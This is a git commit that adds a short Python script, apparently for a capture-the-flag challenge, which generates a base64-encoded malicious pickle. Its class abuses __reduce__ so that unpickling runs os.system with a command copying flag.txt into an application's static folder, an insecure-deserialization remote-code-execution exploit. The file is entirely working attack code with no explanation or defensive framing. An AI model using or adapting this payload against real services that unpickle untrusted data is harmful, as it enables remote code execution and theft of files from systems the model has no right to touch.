f0ad95f9728fbb2cc2293b90426a9702f3183043
BlancoBox <45087513+BlancoBox@users.noreply.github.com>
2023-10-04 02:42:58 -0400

    Add files via upload

---
+++ base64RCE/malicious_pickle.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import pickle
+import base64
+import os
+
+payload = 'cp flag.txt application/static/.'
+
+class RCE:
+    def __reduce__(self):
+        return os.system, (payload,)
+
+if __name__ == '__main__':
+    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
